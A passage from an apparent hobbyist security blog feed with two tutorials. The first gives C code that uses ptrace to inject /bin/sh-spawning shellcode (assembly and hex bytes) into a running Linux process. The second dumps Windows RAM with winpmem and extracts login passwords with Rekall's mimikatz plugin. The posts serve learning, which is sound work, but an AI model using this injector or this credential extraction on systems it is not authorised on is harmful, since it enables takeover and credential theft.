halt its execution.</li> <li>Dump its registers (specifically <code class="language-plaintext highlighter-rouge">RIP/EIP</code>).</li> <li>Write your code to the stack where <code class="language-plaintext highlighter-rouge">RIP</code> is pointing.</li> <li>Send a <code class="language-plaintext highlighter-rouge">SIGCONT</code> to the program to return control.</li> <li>Profit.</li> </ol> <hr/> <h2 id="signals-and-traps">Signals and Traps</h2> <p><img src="/assets/img/jinzo.png" alt="Jinzo" title="Jinzo" class="featured-image"/> Jinzo from Yu-gi-oh! Kills all traps.</p> <p><strong>SIGTRAP</strong>: “Signals” are a form of inter-process communication (IPC) that notifies a thread an event has happened. Examples include:</p> <ul> <li>Division by zero → <code class="language-plaintext highlighter-rouge">SIGFPE</code> (“Floating Point Exception”).</li> <li>Segmentation fault → <code class="language-plaintext highlighter-rouge">SIGSEGV</code> (“Segmentation Violation”).</li> <li><code class="language-plaintext highlighter-rouge">Ctrl+C</code> → <code class="language-plaintext highlighter-rouge">SIGINT</code> (“Signal Interrupt”) – terminates the process.</li> <li><code class="language-plaintext highlighter-rouge">Ctrl+Z</code> → <code class="language-plaintext highlighter-rouge">SIGTSTP</code> (“Terminal Stop”) – suspends execution.</li> <li><code class="language-plaintext highlighter-rouge">Ctrl+\</code> → <code class="language-plaintext highlighter-rouge">SIGQUIT</code> (“Quit”) – terminates the process and provides a core dump.</li> <li><code class="language-plaintext highlighter-rouge">Ctrl+T</code> → <code class="language-plaintext highlighter-rouge">SIGINFO</code> – OS shows information about the running command.</li> </ul> <p><strong>SIGSYS</strong>:<br/> The <code class="language-plaintext highlighter-rouge">SIGSYS</code> signal is sent to a process when it passes a bad argument to a system call. In practice, this kind of signal is rarely encountered since applications rely on libraries (e.g., <code class="language-plaintext highlighter-rouge">libc</code>) to make the call for them. <code class="language-plaintext highlighter-rouge">SIGSYS</code> can also be received by applications violating the Linux <code class="language-plaintext highlighter-rouge">Seccomp</code> security rules configured to restrict them.</p> <p>References:</p> <ul> <li><a href="https://en.wikipedia.org/wiki/System_call">System Call</a></li> <li><a href="https://en.wikipedia.org/wiki/Seccomp">Seccomp</a></li> </ul> <hr/> <h2 id="back-to-ptrace-magic">Back to <code class="language-plaintext highlighter-rouge">ptrace</code> Magic</h2> <p>This will allow us to pause execution, dump the registers, and let us change them to whatever we’d like. <strong>Fuckyeah.</strong></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/ptrace.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/user.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/reg.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="n">pid_t</span> <span class="n">target</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">syscall</span><span class="p">;</span>
+    <span class="kt">long</span> <span class="n">dst</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Usage:</span><span class="se">\n\t</span><span class="s">%s pid</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">target</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"+ Tracing process %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">target</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">((</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_ATTACH</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">"ptrace(ATTACH):"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"+ Waiting for process...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+</code></pre></div></div> <p>Programs like gdb and dbx use traces such as strace and ltrace. ptrace is primarily used for patching running programs.</p> <h2 id="key-features">Key Features</h2> <p>By attaching to another process using the <code class="language-plaintext highlighter-rouge">ptrace</code> call, a tool has extensive control over the operation of its target. This includes manipulation of its file descriptors, memory, and registers.</p> <p>The first parameter we use for <code class="language-plaintext highlighter-rouge">ptrace</code> is <code class="language-plaintext highlighter-rouge">PTRACE_ATTACH</code>, which “attach[es] to the process specified in the pid, making it a tracee of the calling process. The tracee is sent a <code class="language-plaintext highlighter-rouge">SIGSTOP</code>, but will not necessarily have stopped by the completion of this call; use <code class="language-plaintext highlighter-rouge">waitpid(2)</code> to wait for the tracee to stop.” The pid is the next argument. The last two are for an <code class="language-plaintext highlighter-rouge">*address</code> and <code class="language-plaintext highlighter-rouge">*data</code>, but we will <code class="language-plaintext highlighter-rouge">NULL</code> these out.</p> <hr/> <h2 id="injection-code">Injection Code</h2> <p>This is where we can get creative.</p> <p>We can insert our code at the current instruction (<code class="language-plaintext highlighter-rouge">EIP/RIP</code>) being executed.<br/> The downside of this is that it will destroy the target process and will make it impossible for the program to recover its original functionality. This is a “loud” way of doing the job, but it gets the job done.</p> <p>We can inject the code at the address where the <code class="language-plaintext highlighter-rouge">main()</code> is located. There’s a chance that the code there has some initialization that only happens during the beginning of execution, which may keep the original functionality working as expected. <em>(I have yet to test this, but it sounds like something fun to play with!)</em></p> <p>We can inject our code using one of the ELF Injection techniques <em>(again, need to try!)</em></p> <p>Lastly, we can inject our code into the stack like your average buffer overflow, but this might be a problem if the stack is marked as <code class="language-plaintext highlighter-rouge">NX</code> <em>(Non-eXecutable)</em>.</p> <hr/> <p>We will be doing the first option. We’ll be injecting a shell via shellcode. But first, we’re gonna need to get some registers. Let’s <code class="language-plaintext highlighter-rouge">ptrace</code> these MFs.</p> <hr/> <h2 id="get-the-registers-and-smash-the-memory">Get the Registers and Smash the Memory</h2> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span> <span class="p">(</span><span class="s">"+ Getting Registers</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">((</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">perror</span><span class="p">(</span><span class="s">"ptrace(GETREGS):"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"+ Injecting shell code at %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="p">);</span>
+
+<span class="n">inject_data</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="p">,</span> <span class="n">SHELLCODE_SIZE</span><span class="p">);</span>
+
+<span class="n">regs</span><span class="p">.</span><span class="n">rip</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span>
+</code></pre></div></div> <p>Function to Inject Data The ptrace(PTRACE_POKETEXT) function writes our injected code to memory but only works on words. So, we use 32 bits (4 bytes) and increment by 4.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">inject_data</span><span class="p">(</span><span class="n">pid_t</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">src</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">dst</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">,</span> <span class="n">s</span><span class="o">++</span><span class="p">,</span> <span class="n">d</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKETEXT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="o">*</span><span class="n">s</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">perror</span><span class="p">(</span><span class="s">"ptrace(POKETEXT):"</span><span class="p">);</span>
+            <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div> <h2 id="running-the-injected-code">Running the Injected Code</h2> <p>After the target process memory has been modified, we give control back to the program. Multiple ways exist to do this, but we will simply detach from the target process.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"+ Setting instruction pointer to %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">((</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">perror</span><span class="p">(</span><span class="s">"ptrace(GETREGS):"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"+ Run it!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">((</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">perror</span><span class="p">(</span><span class="s">"ptrace(DETACH):"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div> <p>When we modify the instruction pointer, <code class="language-plaintext highlighter-rouge">ptrace(PTRACE_DETACH, ...)</code> subtracts 2 bytes from the Instruction Pointer. The OP of this tutorial explained that he first attempted to inject code into the stack but learned the stack of his program was non-executable. He used the <code class="language-plaintext highlighter-rouge">execstack</code> tool to turn it on, then attempted to use <code class="language-plaintext highlighter-rouge">gdb</code> to break down his program. He then came across another issue, in that, you cannot debug the same program with two debuggers at the same time. It causes a segmentation fault and core dump. Here, his results show they are 2 bytes off.</p> <p><img src="/assets/img/inject-ex1.png" alt="Example 1" title="Example 1" class="featured-image"/> <img src="/assets/img/inject-ex2.png" alt="Example 2" title="Example 2" class="featured-image"/></p> <p>Adding <code class="language-plaintext highlighter-rouge">+2</code> more bytes to <code class="language-plaintext highlighter-rouge">RIP</code> allows for the injection to work properly.</p> <hr/> <h2 id="testing-program">Testing Program</h2> <p>This is a little Hello World program that just spits its PID, next says “Hello World”, then waits 2 seconds before reprinting again.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>   
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"PID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">getpid</span><span class="p">());</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Hello World</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">getchar</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div> <h2 id="the-shellcode">The Shellcode</h2> <p>The OP uses the following shellcode:</p> <pre><code class="language-asm">section .text
+    global _start
+
+_start:
+    xor rax, rax
+    mov rdx, rax             ; No Env
+    mov rsi, rax             ; No argv
+    lea rdi, [rel msg]
+    add al, 0x3b
+    syscall
+
+    msg db '/bin/sh', 0
+</code></pre> <h2 id="final-words">Final Words</h2> <p>This is the extent I have gone into using ptrace. As I continue to learn, I hope to learn more about how debuggers work and how to manipulate programs more. I think it’s so fascinating when you’re able to take something apart and do things that were not originally set for a program to be able to do.</p> <p>Again, I got this tutorial from 0x00sec.org. OP is 0x00pf pico, who has shared much with the community. If it wasn’t for him, I might not have learned this as quickly as I did. I hope this little writeup I did provides another way to learn the same exact material.</p> <p>Lastly, here’s some shellcode user _py provided to make the injection a bit easier:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define SHELLCODE_SIZE 32
+</span>
+<span class="cm">/* Spawn a shell */</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">shellcode</span> <span class="o">=</span>
+    <span class="s">"</span><span class="se">\x48\x31\xc0\x48\x89\xc2\x48\x89</span><span class="s">"</span>
+    <span class="s">"</span><span class="se">\xc6\x48\x8d\x3d\x04\x00\x00\x00</span><span class="s">"</span>
+    <span class="s">"</span><span class="se">\x04\x3b\x0f\x05\x2f\x62\x69\x6e</span><span class="s">"</span>
+    <span class="s">"</span><span class="se">\x2f\x73\x68\x00\xcc\x90\x90\x90</span><span class="s">"</span><span class="p">;</span>
+</code></pre></div></div> <h2 id="resources">Resources</h2> <ul> <li><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097">Linux: Infecting Running Processes (Original Tutorial)</a></li> <li><a href="https://en.wikipedia.org/wiki/Signal_(IPC)">Signals in IPC on Wikipedia</a></li> <li><a href="https://0x00sec.org/t/re-guide-for-beginners-bypassing-sigtrap/2648">Guide for Beginners: Bypassing SIGTRAP</a></li> <li><a href="http://man7.org/linux/man-pages/man2/ptrace.2.html">Ptrace Documentation (man pages)</a></li> <li><a href="https://en.wikipedia.org/wiki/Ptrace">Wikipedia: ptrace</a></li> <li><a href="https://chris-magistrado-c74h.squarespace.com/s/pyc_inject.c">pyc_inject.c Code Example</a></li> <li><a href="https://0x00sec.org/u/0x00pf">0x00pf pico’s Profile on 0x00sec</a></li> <li><a href="https://twitter.com/0x00pico">0x00pf pico on Twitter</a></li> </ul>]]></content><author><name></name></author><category term="blog"/><category term="reverse"/><category term="engineering"/><category term="memory"/><category term="hacking"/><category term="injection"/><summary type="html"><![CDATA[Tutorial on how syscall that control processes work]]></summary></entry><entry><title type="html">Rekalling the Times I Played with Windows</title><link href="https://real0day.github.io//blog/2017/rekalling-the-times-i-played-with-windows/" rel="alternate" type="text/html" title="Rekalling the Times I Played with Windows"/><published>2017-10-22T21:28:16+00:00</published><updated>2017-10-22T21:28:16+00:00</updated><id>https://real0day.github.io//blog/2017/rekalling-the-times-i-played-with-windows</id><content type="html" xml:base="https://real0day.github.io//blog/2017/rekalling-the-times-i-played-with-windows/"><![CDATA[<p><img src="/assets/img/windows-chan.png" alt="Windows Chan" title="Windows Chan" class="featured-image"/> Windows-Chan</p> <p>The more and more you learn about Information Security, the more you learn about how insecure things are. From your personal devices that you are to protect, to devices in our environment. I remember reading my CompTIA Sec+ book back when I was a youngling, and remembered a story in there that described a raid where a hacker took a shotgun and shot his hard drive before the Feds grabbed him and separated him from his computer.</p> <hr/> <h2 id="another-reason-for-ram-acquisition">Another Reason for RAM Acquisition</h2> <p><img src="/assets/img/hawkeye.png" alt="Hawkeye" title="Hawkeye" class="featured-image"/> Hawkeye</p> <p>Another reason as to why the Feds separate hackers from their computers is because their RAM holds valuable information so long as the computer is on. That information includes all passwords, websites, and other types or what forensics people call “artifacts.” <em>A few of the artifacts one can acquire from a memory acquisition:</em><br/> <img src="/assets/img/BenjaminCaudill.png" alt="Benjamin Caudill" title="Benjamin Caudill" class="featured-image"/> Benjamin Caudill (Slide by Benjamin Caudill)</p> <hr/> <h2 id="experimenting-with-memory-acquisition">Experimenting with Memory Acquisition</h2> <p>After playing around with some Reverse Engineering challenges, I’ve been wanting to get deeper and deeper. Down the rabbit hole we go.</p> <h3 id="tools-used">Tools Used:</h3> <ul> <li><a href="http://www.rekall-forensic.com/">Rekall Memory Forensic Framework</a></li> <li><a href="http://www.volatilityfoundation.org/">Volatility</a></li> </ul> <p>A few days ago, I wanted to see if I could take an image of my RAM. The test was conducted on my MacBook Air, so I looked for tools to do this. Rekall, created by Google, has a tool called <code class="language-plaintext highlighter-rouge">osxpmem</code> which will take an image of your RAM. I wrote a script to make this a bit easier. <strong>Root privileges ARE required.</strong> Jonathon Poling goes deeper into how to do this in his terrific <a href="http://ponderthebits.com/2017/02/osx-mac-memory-acquisition-and-analysis-using-osxpmem-and-volatility/">article</a>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>
+
+<span class="c"># Create directories</span>
+<span class="nb">mkdir</span> /tmp/mem
+<span class="nb">mkdir</span> /tmp/mem/Memory_Captures
+
+<span class="c"># Takes us to our work env</span>
+<span class="nb">cp </span>osxpmem_2.0.1.zip /tmp/mem
+<span class="nb">cd</span> /tmp/mem
+unzip osxpmem_2.0.1.zip
+
+<span class="c"># Required to use utilities</span>
+<span class="nb">sudo chown</span> <span class="nt">-R</span> root:wheel osxpmem.app/
+<span class="nb">sudo </span>osxpmem.app/osxpmem <span class="nt">-o</span> Memory_Captures/mem.aff4
+<span class="nb">sudo </span>osxpmem.app/osxpmem <span class="nt">-e</span> /dev/pmem <span class="nt">-o</span> Memory_Captures/mem.raw Memory_Captures/mem.aff4
+
+<span class="c"># Unload our kernel extension</span>
+<span class="nb">sudo </span>osxpmem.app/osxpmem <span class="nt">-u</span>
+</code></pre></div></div> <p>I posted my code on GitHub for your convenience and for the commits. No shame in my commit game. <img src="/assets/img/mem-ex1.png" alt="memory example 1" title="memory example 1" class="featured-image"/></p> <p>I sent this to Rekall and got some problems with profiles. More learning!</p> <p><strong>Profiles are… research</strong></p> <p>“A Mac profile includes the structure definitions for the specific kernel version as well as the addresses of important global variables used in analysis.”<br/> — <em>The Art of Memory Forensics (pg. 784)</em></p> <p>Since Mac profiles are pretty big, they aren’t included with all the fun installs of Volatility; however, some are located on their GitHub. Rekall also has profiles as well on their GitHub. This is kinda what it looks like when you don’t have the correct profiles.</p> <hr/> <h2 id="switching-to-windows-for-memory-acquisition">Switching to Windows for Memory Acquisition</h2> <p><img src="/assets/img/mem-ex2.png" alt="memory example 2" title="memory example 2" class="featured-image"/> So, I put my Mac image down and picked up the other computer next to me—a family member’s Windows 7 computer. Just like I’m sure the rest of you do, I reinstalled the OS for my family because someone who studies Computer Science means I can help remove your malware and spyware you got installed from just doing “normal computer stuff.” 😒</p> <p>I set a password via login and wanted to take an image of a Windows computer to see if I could get the login password from it!</p> <p>Initially, I was worried and thought taking an image might be difficult, or maybe I’d have to dive pretty deep into a tool to figure out the password. I am very grateful for the heroes and heroines that took on this frontier.</p> <p><strong>“If I have seen further than others, it is by standing upon the shoulders of giants.”</strong><br/> — Isaac Newton</p> <hr/> <h2 id="windows-memory-acquisition">Windows Memory Acquisition</h2> <p>I accomplished this goal with two lines. But first, the image:</p> <ol> <li>Get <code class="language-plaintext highlighter-rouge">winpmem</code> (at the time of writing, <code class="language-plaintext highlighter-rouge">winpmem-2.1.post4.exe</code>).</li> <li>Open <code class="language-plaintext highlighter-rouge">cmd.exe</code> as Administrator (Right-Click and click “Run as Administrator”).</li> <li>Run the following command: <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winpmem <span class="nt">-o</span> Win7Image.aff4
+</code></pre></div> </div> </li> </ol> <p><img src="/assets/img/ram_dump.png" alt="ram dump" title="ram dump" class="featured-image"/></p> <p>Got RAM?! YEAH BITCH!</p> <p>Alright, so now let’s open it up in Rekall. Rekall is very well-documented on how to set up their environment.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>virtualenv /tmp/MyEnv
+
+New python executable <span class="k">in</span> /tmp/MyEnv/bin/python
+Installing setuptools, pip...done.
+
+<span class="nv">$ </span><span class="nb">source</span> /tmp/MyEnv/bin/activate
+<span class="nv">$ </span>pip <span class="nb">install</span> <span class="nt">--upgrade</span> setuptools pip wheel
+<span class="nv">$ </span>pip <span class="nb">install </span>rekall-agent rekall
+</code></pre></div></div> <p>If you don’t have virtualenv, install it with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pip <span class="nb">install </span>virtualenv
+</code></pre></div></div> <p>Assuming you got it installed, check it out:</p> <p>We got it loaded in! Now what are those two lines? Well…loading was one of them.</p> <p>Now use the plugin <strong>mimikatz</strong>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rekall <span class="nt">-f</span> Win7Image.aff4 mimikatz
+</code></pre></div></div> <h2 id="profit">Profit</h2> <p>If you have any questions, as I wrote this pretty late and ran through it, please feel free to contact me!</p> <p>The quickest way would be Twitter. Send me more things to play with or correct me if I’m wrong!</p> <p>Until next time, hackers!</p> <hr/> <h2 id="references">References</h2> <ul> <li><a href="https://www.youtube.com/watch?v=0AwI6YrV2h4">DEF CON 21 – Offensive Forensics: CSI for the Bad Guy by Benjamin Caudill</a></li> <li><a href="https://www.youtube.com/watch?v=_fZfDGWpP4U">DEF CON 24 – int0x80 – Anti Forensics AF by DualCore</a></li> <li><em>Taking Memory Forensics to the Next Level</em> by Jamie Levy</li> <li><a href="https://digital-forensics.sans.org/media/rekall-memory-forensics-cheatsheet.pdf">Rekall Memory Forensics Cheatsheet</a></li> <li><a href="http://ponderthebits.com/2017/02/osx-mac-memory-acquisition-and-analysis-using-osxpmem-and-volatility/">OSX (Mac) Memory Acquisition and Analysis Using OSXpmem and Volatility by Jonathon Poling</a></li> <li><a href="https://twitter.com/rhinosecurity">Benjamin Caudill’s Twitter</a></li> <li><a href="https://twitter.com/dualcoremusic?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">DualCore’s Twitter</a></li> <li><a href="https://www.youtube.com/watch?v=GqtAdYS0xyE">Taking Memory Forensics to the Next Level Talk by Jamie Levy</a></li> <li><a href="https://twitter.com/gleeda">Jamie Levy’s Twitter</a></li> <li><a href="http://ponderthebits.com/author/jp/">Jonathon Poling’s Blog</a></li> </ul>]]></content><author><name></name></author><category term="blog"/><category term="memory"/><category term="hacking"/><category term="rekall"/><category term="forensics"/><category term="windows"/><summary type="html"><![CDATA[Tutorial on how to use rekall to dump windows memory]]></summary></entry></feed>
